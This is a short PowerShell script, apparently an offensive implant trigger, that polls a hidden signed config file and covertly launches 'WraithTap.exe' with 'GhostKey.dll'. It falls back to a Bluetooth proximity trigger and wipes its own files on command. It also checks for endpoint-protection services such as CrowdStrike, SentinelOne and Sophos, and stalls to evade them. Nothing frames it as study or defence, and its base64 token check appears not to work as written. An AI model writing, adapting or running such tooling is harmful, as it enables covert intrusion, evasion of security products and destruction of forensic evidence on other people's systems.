# BLETrigger.ps1 (Updated with signature expiry + failover)

$knownDeviceID = "GhostWhisperer"
$authToken = "U2FsdGVkX1+RAVEN-OK=="
$injectCmd = "WraithTap.exe GhostKey.dll"
$cfgPath = "C:\ProgramData\.ghost.cfg"
$key = 'RavenLives'
$timeoutMinutes = 10

function X([string]$d, [string]$k) {
  $kb = [Text.Encoding]::UTF8.GetBytes($k)
  $db = [Text.Encoding]::UTF8.GetBytes($d)
  $h = New-Object Security.Cryptography.HMACSHA256
  $h.Key = $kb
  ([BitConverter]::ToString($h.ComputeHash($db))) -replace '-', ''
}

function Validate-Cfg {
  if (!(Test-Path $cfgPath)) { return $null }
  $j = Get-Content $cfgPath | ConvertFrom-Json
  $c = $j.command; $t = $j.timestamp; $s = $j.signature
  $dt = [datetime]::Parse($t)
  
  $check = X "$c|$t" $key
  if ($s -eq $check) {
    $age = (Get-Date).ToUniversalTime().Subtract($dt).TotalMinutes
    if ($age -lt $timeoutMinutes) {
      return $c
    } else {
      Write-Host "[!] Signature expired: $age minutes"
      return "FAILOVER"
    }
  }
  return $null
}

function Check-EDR {
  $x = "Crowd,Sentinel,Carbon,Defend,Sophos" -split ","
  Get-Service | Where-Object { $x -match $_.Name -or $x -match $_.DisplayName }
}

function D($cmd) {
  switch ($cmd) {
    'FIRE'     { Start-Process -WindowStyle Hidden -FilePath "WraithTap.exe" -ArgumentList "GhostKey.dll" }
    'WIPE'     { Remove-Item "WraithTap.exe","GhostKey.dll","SilentBloom.ps1" -Force -ErrorAction SilentlyContinue }
    'FAILOVER' {
      Write-Host "[!] Encrypted command expired. Attempting BLE proximity fallback."
      $d = Get-PnpDevice -Class Bluetooth -Status OK | Where { $_.FriendlyName -eq $knownDeviceID }
      if ($d -and ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($authToken)) -eq "RAVEN-OK")) {
        D 'FIRE'
      } else {
        Write-Host "[!] No fallback proximity trigger found. Holding."
      }
    }
  }
}

if (Check-EDR) { Start-Sleep 300 }

while ($true) {
  $cmd = Validate-Cfg
  if ($cmd) { D $cmd; break }
  Start-Sleep 5
}
